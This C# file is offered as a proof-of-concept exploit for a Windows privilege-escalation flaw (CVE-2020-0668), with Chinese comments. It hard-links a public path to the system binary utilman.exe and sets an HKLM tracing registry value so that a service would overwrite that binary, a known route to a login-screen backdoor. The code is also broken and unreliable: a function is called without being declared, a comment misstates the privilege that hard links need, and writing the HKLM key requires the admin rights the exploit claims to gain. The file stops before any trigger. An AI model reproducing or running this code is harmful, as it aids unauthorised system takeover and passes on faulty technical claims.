using System.Diagnostics;
using System.IO;
using Microsoft.Win32;

namespace CVE_2020_0668_POC
{
    class Program
    {
        static void Main(string[] args)
        {
            string targetFile = @"C:\Windows\System32\utilman.exe";
            string hardlinkPath = @"C:\Users\Public\log.txt"; // 可写路径
            string backupPath = @"C:\Users\Public\utilman_backup.exe";

            // 备份原文件
            File.Copy(targetFile, backupPath, true);

            // 创建硬链接（需要SeCreateSymbolicLinkPrivilege，通常普通用户有）
            if (!CreateHardLink(hardlinkPath, targetFile, IntPtr.Zero))
            {
                Console.WriteLine("Failed to create hardlink");
                return;
            }

            // 设置注册表
            using (RegistryKey key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Tracing\WmiApSrv", true))
            {
                if (key == null)
                {
                    // 创建键
                    Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Tracing\WmiApSrv");
                }
                using (RegistryKey subKey = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Tracing\WmiApSrv", true))
                {
                    subKey.SetValue("LogFilePath", hardlinkPath, RegistryValueKind.String);
                }
            }

            // 触发服务（需要管理员权限？这里用另一种方式：等待系统重启或利用其他服务）
